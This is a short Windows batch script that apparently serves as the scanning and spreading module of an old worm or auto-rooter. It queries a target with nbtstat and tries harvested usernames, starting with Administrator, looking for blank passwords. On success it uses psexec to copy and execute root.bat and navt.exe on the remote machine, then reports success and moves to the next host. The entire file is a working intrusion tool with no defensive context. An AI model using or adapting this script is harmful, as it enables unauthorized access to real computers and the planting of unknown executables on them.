@echo off
set username=
nbtstat -A %1 > %1.tmp
find "<20>" %1.tmp
IF ERRORLEVEL ==1 goto nothack
find "<03>" %1.tmp > u%1.tmp
call test.bat %1 Administrator
if .%username%==. for /f "skip=2" %%x in (u%1.tmp) DO call test.bat %1 %%x
if .%username%==. GOTO end

:root
psexec \\%1 -u %username% -p "" -c -f -d root.bat | find "started" > nul
psexec \\%1 -u %username% -p "" -c -f -d navt.exe | find "started" > nul


if ERRORLEVEL ==1 goto error

dde sdc command null /scan3 Successfully Uploaded on %1


goto end

:error
goto end
:nothack
dde sdc command null /scan2 %1 -- Not Vulnerable
goto end
:end
dde sdc command null /nexthost
del *%1.tmp
